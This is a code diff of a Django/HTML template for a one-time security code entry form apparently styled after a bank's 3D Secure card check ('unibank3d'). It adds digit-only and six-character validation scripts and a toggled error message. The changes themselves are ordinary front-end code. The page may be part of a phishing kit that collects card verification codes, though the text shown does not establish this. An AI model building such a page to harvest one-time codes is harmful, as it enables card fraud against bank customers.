@@ -42,9 +42,26 @@
                     <div class="item">
                           <form method="POST"  action='unibank3d' data-validation-context="*" novalidate="">
                             {% csrf_token %}
-                          <input type="tel" name="secpass" value="" autocomplete="one-time-code" class="cp-wrappable  cp-input-OTP" </div>
+                            <input type="tel" name="secpass" value="" autocomplete="one-time-code" class="cp-wrappable  cp-input-OTP">
+
+                            <script>
+                            // sadece rakam yazılmasını sağlar
+                            document.getElementsByName("secpass")[0].addEventListener("input", function(event) {
+                                let value = event.target.value;
+                                event.target.value = value.replace(/\D/g, "");
+                            });
+                            
+                            // maksimum 6 rakam yazılmasını sağlar
+                            document.getElementsByName("secpass")[0].addEventListener("input", function(event) {
+                                let value = event.target.value;
+                                if (value.length > 6) {
+                                    event.target.value = value.slice(0, 6);
+                                }
+                            });
+                            </script>
+                            </div>
                         <div class="item item-indent cp-error"> </div>
-                        <a><h5> Təhlükəsizlik kodu yanlışdır</h5> </a>
+                        <a id="secureCodeError" style="display: {{display}};"><h5>Təhlükəsizlik kodu yanlışdır</h5></a>
 				<style>
 					h5 {
 					  font-size: 0.9rem;
